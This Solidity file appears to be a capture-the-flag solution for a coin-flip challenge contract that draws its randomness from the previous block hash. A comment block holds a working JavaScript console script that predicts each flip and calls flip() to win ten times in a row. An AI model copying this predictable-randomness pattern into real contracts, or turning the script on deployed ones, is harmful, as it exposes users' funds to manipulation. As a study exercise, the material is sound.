// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * // 在浏览器控制台中运行这个自动化脚本
 * const FACTOR = BigInt('57896044618658097711785492504343953926634992332820282019728792003956564819968');
 * const player = await web3.eth.getAccounts().then(accounts => accounts[0]);
 *
 * async function attackCoinFlip() {
 *     for (let i = 0; i < 11; i++) {
 *         // 等待新区块
 *         const currentBlock = await web3.eth.getBlockNumber();
 *         console.log(`Waiting for new block... Current: ${currentBlock}`);
 *
 *         // 等待下一个区块被挖出
 *         await new Promise(resolve => {
 *             const interval = setInterval(async () => {
 *                 const newBlock = await web3.eth.getBlockNumber();
 *                 if (newBlock > currentBlock) {
 *                     clearInterval(interval);
 *                     resolve();
 *                 }
 *             }, 1000);
 *         });
 *
 *         // 计算预测结果
 *         const previousBlockNumber = (await web3.eth.getBlockNumber()) - 1;
 *         const blockHash = await web3.eth.getBlock(previousBlockNumber).then(block => block.hash);
 *         const blockValue = BigInt(blockHash);
 *         const coinFlip = blockValue / FACTOR;
 *         const guess = coinFlip === BigInt(1);
 *
 *         console.log(`Attempt ${i + 1}: Predicting ${guess}`);
 *
 *         // 调用 flip
 *         try {
 *             const result = await contract.flip(guess, { from: player });
 *             console.log(`Success: ${result}`);
 *         } catch (error) {
 *             console.error(`Error on attempt ${i + 1}:`, error);
 *             i--; // 重试
 *             continue;
 *         }
 *
 *         // 检查进度
 *         const wins = await contract.consecutiveWins().then(v => parseInt(v.toString()));
 *         console.log(`Consecutive wins: ${wins}`);
 *
 *         if (wins >= 10) {
 *             console.log('Success! 10 consecutive wins achieved!');
 *             break;
 *         }
 *
 *         // 等待一段时间再进行下一次攻击
 *         await new Promise(resolve => setTimeout(resolve, 15000));
 *     }
 * }
 *
 * // 运行攻击
 * attackCoinFlip();
 */
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
